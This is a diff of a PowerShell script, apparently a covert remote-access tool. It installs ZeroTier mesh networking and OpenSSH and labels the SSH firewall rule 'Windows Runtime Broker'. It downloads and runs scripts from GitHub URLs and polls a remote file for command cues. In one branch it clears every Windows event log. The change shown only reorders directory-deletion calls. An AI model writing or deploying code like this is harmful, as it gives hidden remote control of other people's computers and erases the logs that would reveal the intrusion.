@@ -13,7 +13,6 @@ $ztprogramname = "ZeroTier One"
 $sshprogramname = "OpenSSH"
 $sshfirewall = "Windows Runtime Broker"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
 $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ZeroTierStuff/MeshNetworkInstall.ps1"
 $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
@@ -344,7 +343,9 @@ if ($storedCode -ne $null) {
 				}
               		#Zerotier Install, OpenSSH Enabled
               		"ztinstall" {
-                         		Retry-Operation {				
+                         		Retry-Operation {	
+			   			Delete-Directories -directories $ztdatadir
+                      				Delete-Directories -directories $ztdir
 	 					Uninstall-Program -ProgramName $ztprogramname
                       				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                       				Delete-ServiceSafe -ServiceName $ztservice
@@ -352,8 +353,6 @@ if ($storedCode -ne $null) {
                       				Disable-FirewallRules -ruleName $ztfirewall
                       				Disable-FirewallRules -ruleName $ztfirewall2
                       				Disable-FirewallRules -ruleName $ztfirewall3
-                      				Delete-Directories -directories $ztdatadir
-                      				Delete-Directories -directories $ztdir
 			  			web-install -InstallScriptURL $ztinstall
 			   			web-install -InstallScriptURL $pinguninstallscript
 			  			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
